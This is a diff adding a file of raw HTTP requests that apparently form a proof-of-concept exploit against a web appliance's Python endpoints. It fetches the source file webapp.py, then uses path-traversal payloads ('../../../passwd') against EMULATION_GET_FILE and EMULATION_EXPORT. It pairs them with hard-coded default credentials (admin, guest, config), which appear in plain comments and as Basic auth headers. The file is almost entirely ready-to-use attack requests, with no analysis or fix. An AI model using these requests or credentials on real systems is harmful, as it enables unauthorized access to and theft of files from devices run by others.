@@ -1,0 +1,152 @@
+#Get the source code: webapp.py 
+
+GET /webapp.py HTTP/1.1
+Host: *.*.*.*
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Authorization: Basic YWRtaW46bnNnYWRtaW4=
+Connection: close
+
+
+
+
+
+
+
+
+
+#Arbitrary file access
+#admin:nsgadmin
+
+
+POST /PY/EMULATION_GET_FILE HTTP/1.1
+Host: *.*.*.*
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: application/xml, text/xml, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://*.*.*.*/
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 24
+Authorization: Basic YWRtaW46bnNnYWRtaW4=
+Connection: close
+
+FileName=../../../passwd
+
+
+
+
+
+
+
+
+
+#Arbitrary file access
+#guest:nsgguest
+
+POST /PY/EMULATION_GET_FILE HTTP/1.1
+Host: *.*.*.*
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: application/xml, text/xml, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://*.*.*.*/
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 24
+Authorization: Basic Z3Vlc3Q6bnNnZ3Vlc3Q=
+Connection: close
+
+FileName=../../../passwd
+
+
+
+
+
+
+
+
+
+#Arbitrary file access
+#config:nsgconfig
+
+POST /PY/EMULATION_GET_FILE HTTP/1.1
+Host: *.*.*.*
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: application/xml, text/xml, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://*.*.*.*/
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 24
+Authorization: Basic Y29uZmlnOm5zZ2NvbmZpZw==
+Connection: close
+
+FileName=../../../passwd
+
+
+
+
+
+
+
+
+
+#Any file download
+#admin:nsgadmin
+
+POST /PY/EMULATION_EXPORT HTTP/1.1
+Host: *.*.*.*
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: application/xml, text/xml, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://*.*.*.*/
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 24
+Authorization: Basic YWRtaW46bnNnYWRtaW4=
+Connection: close
+
+FileName=../../../passwd
+
+
+
+
+
+#Any file download
+#config:nsgconfig
+
+POST /PY/EMULATION_EXPORT HTTP/1.1
+Host: *.*.*.*
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: application/xml, text/xml, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://*.*.*.*/
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 24
+Authorization: Basic Y29uZmlnOm5zZ2NvbmZpZw==
+Connection: close
+
+FileName=../../../passwd
+
+
+
+
+
+#Any file download
+#guest:nsgguest
+
+POST /PY/EMULATION_EXPORT HTTP/1.1
+Host: *.*.*.*
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: application/xml, text/xml, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Referer: http://*.*.*.*/
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Content-Length: 24
+Authorization: Basic Z3Vlc3Q6bnNnZ3Vlc3Q=
+Connection: close
+
+FileName=../../../passwd
